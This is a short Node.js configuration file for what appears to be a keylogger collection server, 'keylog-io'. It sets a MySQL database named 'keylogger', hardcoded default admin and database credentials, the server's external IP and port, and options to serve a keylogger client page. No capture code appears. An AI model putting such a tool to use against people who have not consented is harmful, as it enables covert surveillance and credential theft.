const { name, version, bin } = require('../package.json');
const networkInterfaces = require('os').networkInterfaces
const getLocalExternalIp = () => [].concat.apply([], Object.values(networkInterfaces()))
  .filter(details => details.family === 'IPv4' && !details.internal)
  .pop().address;

const binName = Object.keys(bin)[0];

module.exports = {
  name: binName,

  // Database connection options
  database: {
    name: 'keylogger',
    hostname: 'localhost',
    port: 3306,
    username: binName,
    password: binName,
    debug: false
  },

  // Administrator interface basic auth
  username: 'keylog-io',
  password: 'keylog-io',

  // Service settings
  hostname: getLocalExternalIp(),
  port: 3000,
  open: false,

  // serve a demo keylogger-client page
  serveDemo: false,

  // serve the keylogger client (bundled with socket.io)
  serveClient: false
}
